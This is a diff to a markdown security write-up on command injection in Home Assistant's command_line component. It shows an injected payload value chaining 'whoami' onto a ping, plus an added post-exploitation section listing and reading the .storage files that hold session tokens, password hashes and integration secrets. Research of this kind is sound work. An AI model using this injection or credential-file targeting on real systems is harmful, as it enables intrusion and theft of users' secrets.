@@ -119,7 +119,7 @@
     * **Malicious Payload:** An attacker sets the `input_text` value to `"8.8.8.8; whoami > /tmp/pwned.txt"`.
     * **Result:** The system executes both the `ping` and the malicious `whoami` command.
 
-* **Proof of Concept (PoC) Execution:** 💥
+* **Proof of Concept (PoC) Execution:**
     After initial attempts to trigger the vulnerability via `configuration.yaml` failed, a "Direct Execution" method was used to prove the impact. The following terminal log documents the successful exploit.
 
     1.  **Environment Setup:** A clean, privileged Home Assistant container was launched to provide a stable environment.
@@ -144,9 +144,64 @@
         root
         ```
 
+    ![alt text](image.png)
+
+### 3. Post-Exploitation Analysis (Demonstrating Full Impact) 
+
+Following the successful PoC, post-exploitation techniques were performed to demonstrate the full impact of the compromise.
+
+* **Step 1: Initial Reconnaissance:** The first step for an attacker is to understand the compromised environment.
+    * **Process Listing (`ps aux`):** Confirmed that the Home Assistant process is running as the `root` user.
+    * **File Listing (`ls -la /config`):** Mapped the configuration directory, identifying log files, the main configuration, and the critical `.storage` directory.
+        ```bash
+        303b95ed4090:/config# ls -la /config
+        total 36
+        drwxr-xr-x    1 root     root          4096 Oct 14 21:02 .
+        dr-xr-xr-x    1 root     root          4096 Oct 14 20:59 ..
+        -rw-r--r--    1 root     root             9 Oct 14 20:59 .HA_VERSION
+        drwxr-xr-x    2 root     root          4096 Oct 14 21:29 .storage
+        -rwxrwxrwx    1 1000     1000           454 Oct 14 20:59 configuration.yaml
+        -rw-r--r--    1 root     root           324 Oct 14 21:00 home-assistant.log
+        ...
+        ```
+
+* **Step 2: Locating Sensitive Data:** The hidden `.storage` directory was identified as the primary target for data theft.
+    ```bash
+    303b95ed4090:/config# ls -la /config/.storage
+    total 80
+    -rw-------    1 root     root          2895 Oct 14 21:02 auth
+    -rw-------    1 root     root           265 Oct 14 21:01 auth_provider.homeassistant
+    -rw-r--r--    1 root     root          2175 Oct 14 21:02 core.config_entries
+    ...
+    ```
+    This revealed the location of the "crown jewel" files: `auth` (session tokens), `auth_provider.homeassistant` (hashed passwords), and `core.config_entries` (integration secrets).
+
+* **Step 3: Data Exfiltration (Simulated):** The final step for an attacker is to steal the credentials. Reading the `core.config_entries` file demonstrates this capability.
+    ```json
+    303b95ed4090:/config# cat /config/.storage/core.config_entries
+    {
+      "version": 1,
+      "minor_version": 5,
+      "key": "core.config_entries",
+      "data": {
+        "entries": [
+          {
+            "created_at": "...",
+            "data": {},
+            "domain": "backup",
+            ...
+          }
+        ]
+      }
+    }
+    ```
+    While this clean instance only contains default entries, in a real-world scenario this file would contain the API keys, tokens, and other secrets for all user-configured integrations.
+
+
 * **Impact:** This vulnerability allows for **arbitrary command execution** within the Home Assistant container. An attacker could leverage this to steal secrets from other integrations, pivot to attack other devices on the local network, or install malware.
 
 * **Conclusion:** The `command_line` component is **vulnerable to OS Command Injection**. While this is by design for flexibility, the security implications of combining templates with shell execution are significant.
 
 
 ---
+
